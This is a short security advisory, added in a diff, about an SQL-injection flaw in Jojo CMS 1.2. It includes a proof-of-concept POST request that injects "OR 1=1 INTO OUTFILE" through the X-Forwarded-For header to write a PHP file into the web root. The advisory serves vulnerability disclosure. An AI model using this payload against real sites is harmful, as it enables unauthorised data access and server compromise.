@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/59934/info
+
+Jojo CMS is prone to an SQL-injection vulnerability because it fails to sanitize user-supplied input.
+
+A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Jojo CMS 1.2 is vulnerable; other versions may also be affected. 
+
+POST /articles/test/ HTTP/1.1
+X-Forwarded-For: ' OR 1=1 INTO OUTFILE '/var/www/file.php' -- 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+name=name&email=user%40mail.com&website=&anchortext=&comment=comment&submit=Post+Comment
